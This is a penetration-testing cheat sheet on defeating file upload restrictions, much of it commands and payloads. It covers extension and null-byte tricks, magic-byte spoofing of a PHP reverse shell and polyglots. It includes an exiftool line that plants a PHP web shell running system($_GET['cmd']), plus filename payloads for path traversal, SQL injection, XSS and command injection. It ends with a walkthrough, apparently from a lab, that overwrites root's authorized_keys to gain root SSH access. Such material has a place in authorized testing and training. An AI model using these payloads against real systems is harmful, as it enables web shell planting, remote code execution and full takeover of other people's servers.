## Bypassing File Upload Restrictions
```
1. Create a malicious file with an extension that is accepted by the application.
2. Upload that file and click on send.
3. Capture the request in any proxy tool, edit the file extension to the malicious extension that you want. In some cases, you might need to change the content type of a file.
4. Forward the request to the server.

Suppose you have a limitation that you can only upload in a few formats like PDF, JPEG, JPG, ….But what if you can upload a PHP file by defying the Upload mechnism and validation of file type check. 

How does Bypass work
Well it depends on which kind of validation the system is using …it is just verfying the extension ? if its just doing that then it becomes very easy to bypass and upload a PHP file or something malicious.
Suppose we have to upload a JPG file so the extension must be something.jpg

Bypassing Normal extension
Now what we can do is we can upload a file which looks like this something.php.jpg or somethings.jpg.php.
```

## Bypassing Magic Byte validation
```
Magic Bytes
Successfully use magic bytes to fool the upload function into thinking php-reverse-shell.php was .pdf:
hexeditor -b php-reverse-shell.php   <--- Ended up putting in  25 50 44 46 2D (PDF) 
https://en.wikipedia.org/wiki/List_of_file_signatures
I added an additional ..... (five) dots so the php payload does not get affected by inserting 25 50 44 46 2D via hexeditor -b, dont forget the -b 
.....<?php
/backend/default/uploads/php-reverse-shell.php <----Had to go back and fuzz to find trigger url. /uploads/php-reverse-shell.php

- Use a magic mime type:
    - https://en.wikipedia.org/wiki/List_of_file_signatures#
    - Example use "GIF89a;" in a php file
```


## Polyglots
```
For this method we use polygots. Polyglots, in a security context, are files that are a valid form of multiple different file types. For example, a GIFAR is both a GIF and a RAR file. There are also files out there that can be both GIF and JS, both PPT and JS, etc.

so while we have to upload a JPEG file type we actaully can upload a PHAR-JPEG file which will appear to be a JPEg file type to the server while validating. the reason is the file PHAR-JPEg file has both the JPEG header and the PHP file also. so while uploading it didn’t get detected and later after processing the PHP file can be used to exploit.

And at last Uploading a shell to some random websites for fun is not really cool so don’t ever try untill unless you have the permission to test.
```


## Bypass file checks for upload
```
- Rename the file
    - php phtml, .php, .php3, .php4, .php5, and .inc
    - asp asp, .aspx
    - perl .pl, .pm, .cgi, .lib
    - jsp .jsp, .jspx, .jsw, .jsv, and .jspf
    - Coldfusion .cfm, .cfml, .cfc, .dbm

- PHP bypass trickery (Must be PHP < 5.3)
    - Add a question mark at the end 
        - dog.jpg?
    - NULL BYTE
        - dog.jpg%00
        
- exiftool (inject RCE into metadata comment section)
    > exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
    > mv lo.jpg lo.php.jpg
```

## Trial and Error Bypass
```
Php not allowed? Trial and error to pass it. 

try .phps , .php7 

PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
Coldfusion: .cfm, .cfml, .cfc, .dbm
Flash: .swf
Perl: .pl, .cgi
Erlang Yaws Web Server: .yaws

Also test these extensions using some Uppercase letter: 
pHp, .pHP5, .PhAr, .pHPs, .PhPs, .pHpS, .phpS, .phPs, .Php7, .pHp7, .phP7, .Hphp, .hPhp, .hpHp, hphP, .Phtm, .pHtm, .phTm, .phtM, .PhTm, .pHtM, .PhtM, .Pht, .pHt, .phT, .PHt, .pHT, .PhT

.php, .Php, .pHp, .phP, .php2, .Php2, .pHp2, .phP2, .php4, .Php4, .pHp4, .phP4, .PhP4, .pHP4, .php5, .Php5, .pHp5, .phP5, .PhP5, .pHP5, .PHp5, .php6, .Php6, .pHp6, .phP6, .PhP6, .pHP6, .PhP6, .php7, .Php7, .pHp7, .phP7, .PhP7, .pHP7, .PhP7, .phps, .Phps, .pHps, .phPs, .phpS, .pHPS, .phPS, .PhpS, .PhPs, .PhPS, .pHPS, .pht, .Pht, .pHt, .phT, .pHT, .PhT, .pHt, .phtm, .Phtm, .pHtm, .phTm, .phtM, .PhtM, .PHtm, .PHTm, .phTM, .phtml, .Phtml, .pHtml, .phTml, .phtMl, .phtmL, .PhtmL, .PHtml, .PhTmL, .phTML, .phTml, .phTmL, .pgif, .Pgif, .pGif, .pgIf, .pgiF, .PgiF, .pGIf, .pgIF, .pGIF, .PgiF, .shtml, .Shtml, .sHtml, .shTml, .shtMl, .shtmL, .ShtmL, .sHtMl, .ShTML, .ShTmL, .htaccess, .Htaccess, .hTaccess, .htAccess, .htaCcess, .htacCess, .htaccEss, .htacceSs, .htaccesS, .HtaccesS, .hTaccesS, .htAcceSS, .htaCCess, .htacCesS, .htacCeSs, .HtaCceSs, .hTAcCeSs, .hTAaCEsS, .phar, .Phar, .pHar, .phAr, .phaR, .PhaR, .pHaR, .pHAr, .pHAR, .PhAr, .inc, .Inc, .iNc, .inC, .InC, .iNC, .INc, .hphp, .Hphp, .hPhp, .hpHp, .hphP, .HphP, .hPHp, .hpHP, .HphP, .ctp, .Ctp, .cTp, .ctP, .cTP, .CTp, .CtP, .CTp, .module, .Module, .mOdule, .moDule, .modUle, .moduLe, .modulE, .MoDuLe, .MOdulE, .MoDULe, .moDule, .moDUle, .moDULE 

Try adding a valid extension before the execution extension (use previous extensions also):
.png.php, .png.Php5, .jpg.php, .txt.php, etc. 

Try adding special characters at the end. You could use Burp to bruteforce all the ascii and Unicode characters. (Note that you can also try to use the previously motioned extensions)
.php%20
.php%0a
.php%00
.php%0d%0a
.php/
.php.\
file.
.php....
.pHp5....

Try doubling the extension or adding junk data (null bytes) between extensions. You can also use the previous extensions to prepare a better payload.
.png.php
.png.pHp5
.php#.png
.php%00.png
.php\x00.png
.php%0a.png
.php%0d%0a.png
.phpJunk123png

Add another layer of extensions to the previous check:
file.png.jpg.php
file.php%00.png%00.jpg

ex Misconfiguration
Try to put the exec extension before the valid extension and pray so the server is misconfigured. (useful to exploit Apache misconfigurations where anything with extension** .php, but not necessarily ending in .php** will execute code):
ex: file.php.png

Break Filename Limits
Try to break the filename limits. The valid extension gets cut off. And the malicious PHP gets left. AAA<--SNIP-->AAA.php
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png

# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# Make the payload
AAA<--SNIP 232 A-->AAA.php.png

Other Tricks to check
Find a vulnerability to rename the file already uploaded (to change the extension).
```

## File upload to other vulnerabilities
```
Path Traversal from File Upload?
Set filename to ../../../tmp/lol.png and try to achieve a path traversal

SQLi?
Set filename to sleep(10)-- -.jpg and you may be able to achieve a SQL injection

Xss?
Set filename to <svg onload=alert(document.domain)> to achieve a XSS

Command Injection?
Set filename to ; sleep 10; to test some command injection
```

## SSH Key Upload
```
kali@kali:~$ curl http://site.com:8000/meteor/index.php
404 page not found

kali@kali:~$ curl http://site.com:8000/admin.php
404 page not found
Failed attempts to access PHP files

index.php and admin.php files no longer exist in the web application. 
We can safely assume that the web server is no longer using PHP. 

Let's try to upload a text file. 
We'll start Burp to capture the requests and use the form on the web application to upload the test.txt file from the previous section.

Next, let's check if the web application allows us to specify a relative path in the filename and write a file via Directory Traversal outside of the web root. 
We can do this by modifying the "filename" parameter in the request so it contains ../../../../../../../test.txt, then click send.

Web applications using Apache, Nginx or other dedicated web servers often run with specific users, such as www-data on Linux. 
Traditionally on Windows, the IIS web server runs as a Network Service account, a passwordless built-in Windows identity with low privileges. 
Starting with IIS version 7.5, Microsoft introduced the IIS Application Pool Identities. These are virtual accounts running web applications grouped by application pools. 
Each application pool has its own pool identity, making it possible to set more precise permissions for accounts running web applications.

When using programming languages that include their own web server, administrators and developers often deploy the web application without any privilege structures by running applications as root or Administrator to avoid any permissions issues.
This means we should always verify whether we can leverage root or administrator privileges in a file upload vulnerability.

Let's try to overwrite the authorized_keys file in the home directory for root. 
If this file contains the public key of a private key we control, we can access the system via SSH as the root user.

Prepare authorized_keys file for File Upload
To do this, we'll create an SSH keypair with ssh-keygen, as well as a file with the name authorized_keys containing the previously created public key.

kali@kali:~$ ssh-keygen

Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub

kali@kali:~$ cat fileup.pub > authorized_keys

Now that the authorized_keys file contains our public key, we can upload it using the relative path ../../../../../../../root/.ssh/authorized_keys. 
We will select our authorized_keys file in the file upload form and enable intercept in Burp before we click on the Upload button. 
When Burp shows the intercepted request, we can modify the filename accordingly and press Forward.

If we've successfully overwritten the authorized_keys file of the root user, we should be able to use our private key to connect to the system via SSH. We should note that often the root user does not carry SSH access permissions. However, since we can't check for other users by, for example, displaying the contents of /etc/passwd, this is our only option.

The target system runs an SSH server on port 2222. Let's use the corresponding private key of the public key in the authorized_keys file to try to connect to the system. We'll use the -i parameter to specify our private key and -p for the port.

In the Directory Traversal Learning Unit, we connected to port 2222 on the host sit.com and our Kali system saved the host key of the remote host. Since the target system of this section is a different machine, SSH will throw an error because it cannot verify the host key it saved previously. To avoid this error, we'll delete the known_hosts file before we connect to the system. This file contains all host keys of previous SSH connections.
kali@kali:~$ rm ~/.ssh/known_hosts

Using the SSH key to successufully connect via SSH as the root user:

kali@kali:~$ ssh -p 2222 -i fileup root@site.com
The authenticity of host '[site.com]:2222 ([192.168.50.16]:2222)' can't be established.
ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
root@76b77a6eae51:~#

    We could successfully connect as root with our private key due to the overwritten authorized_keys file. 
    Facing a scenario in which we can't use a file upload mechanism to upload executable files, we'll need to get creative to find other vectors we can leverage.


**Test PDF upload functionality.**
- [https://github.com/jonaslejon/malicious-pdf](https://github.com/jonaslejon/malicious-pdf)

